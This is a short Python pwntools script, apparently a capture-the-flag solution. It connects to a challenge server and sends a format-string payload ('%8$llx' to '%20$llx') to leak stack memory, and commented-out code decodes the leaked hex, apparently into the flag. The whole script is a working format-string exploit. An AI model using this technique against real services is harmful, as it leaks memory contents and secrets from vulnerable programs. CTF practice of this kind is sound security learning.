#!/usr/bin/env python3

from pwn import *
import struct
import binascii

if __name__ == "__main__":
    HOST = "host1.metaproblems.com"
    PORT = 5470
    s = remote(HOST, PORT)
    print(s.recvuntil(b"guess?\n"))

    # percent_x = b" %x" * 16

    payload = ''

    for i in range(8, 21):
        fmt = f"%{i}$llx "
        payload += fmt

    s.sendline(payload.encode())

    print(s.recvline())


    # data = data.split()[4:]
    # print(data)

    # for i in data:
    #     print(binascii.unhexlify(i)[::-1].decode(),end='')

